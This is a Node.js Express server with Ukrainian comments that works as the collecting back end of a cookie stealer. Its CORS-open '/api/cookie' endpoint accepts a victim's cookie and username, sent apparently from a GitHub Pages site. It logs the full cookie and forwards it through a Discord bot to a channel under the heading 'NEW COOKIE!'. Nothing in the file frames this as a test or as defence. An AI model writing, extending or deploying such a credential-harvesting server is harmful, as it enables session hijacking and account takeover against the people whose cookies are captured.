const express = require('express');
const http = require('http');
const Discord = require('discord.js');
require('dotenv').config();
const cors = require('cors'); // Для підключення до GitHub Pages

const app = express();
const server = http.createServer(app);

// Налаштування бота
const client = new Discord.Client({ intents: [] });

client.login(process.env.DISCORD_TOKEN).catch(console.error);

client.on('ready', () => {
    console.log(`Bot ready! Logged in as ${client.user.tag}`);
});

// Ендпоінт для прийому куки
app.use(cors()); // Дуже важливо, щоб GitHub Pages міг відправити дані
app.post('/api/cookie', async (req, res) => {
    const data = req.body;
    
    if (!data.cookie || !data.username) {
        return res.status(400).json({ error: "Invalid Data" });
    }

    console.log(`New Cookie from ${data.username}:`, data.cookie);

    try {
        await client.channels.cache.get(process.env.DISCORD_CHANNEL_ID).send(
            `🔴 **НОВИЙ COOKIE!**\n\n` +
            `**Користувач:** ${data.username}\n` +
            `**Cookie:** \`${data.cookie.substring(0, 50)}...\`\n` +
            `**Час:** ${new Date().toLocaleString()}`
        );
    } catch (err) {
        console.error("Discord Error:", err);
    }

    res.json({ success: true });
});

// Запуск сервера на порту 5000
server.listen(process.env.PORT || 5000, () => {
    console.log(`Server running on port ${process.env.PORT || 5000}`);
});
